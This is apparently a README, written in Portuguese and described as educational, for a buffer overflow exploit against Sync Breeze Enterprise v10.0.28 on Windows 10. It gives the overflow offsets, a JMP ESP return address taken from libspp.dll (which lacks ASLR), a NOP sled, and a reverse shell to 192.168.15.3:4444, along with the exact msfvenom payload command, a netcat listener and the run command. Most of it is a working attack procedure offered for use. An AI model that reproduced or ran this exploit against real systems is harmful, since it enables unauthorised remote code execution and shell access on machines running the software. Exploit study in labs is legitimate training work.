# BufferOverflow SyncBreeze Enterprise v10.0.28

Exploit didático para explorar o Sync Breeze v10.0.28 rodando no Windows 10 Enterprise (x64) e ganhar reverse shell

## SyncBreeze Enterprise v10.0.28
http://www.syncbreeze.com/setups/syncbreezeent_setup_v10.0.28.exe

## Resumo:

- 780 bytes para sobrescrever o registrador EAX.
- 4 bytes para sobrescrever o registrador EIP (escrito em little endian) com um endereço de retorno JMP ESP da DLL libspp.dll do próprio software, que não possui proteção ASLR.
- 16 No-Operations para garantir a perfeita execução do payload.
- 351 bytes de payload para realizar a conexão reversa com 192.168.15.3:4444.

## Gerando o mesmo payload no MSFVENOM:
```
msfvenom -p windows/shell_reverse_tcp lhost=192.168.15.3 lport=4444 exitfunc=thread -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -f c
```

## Como usar:

É necessário gerar um novo payload de acordo com o IP e porta que deseja receber a conexão reversa.

Após substituir no script prepare para receber a conexão.
```
nc -vnlp 4444
```

Execute o exploit:
```
python2 exploit.py
```
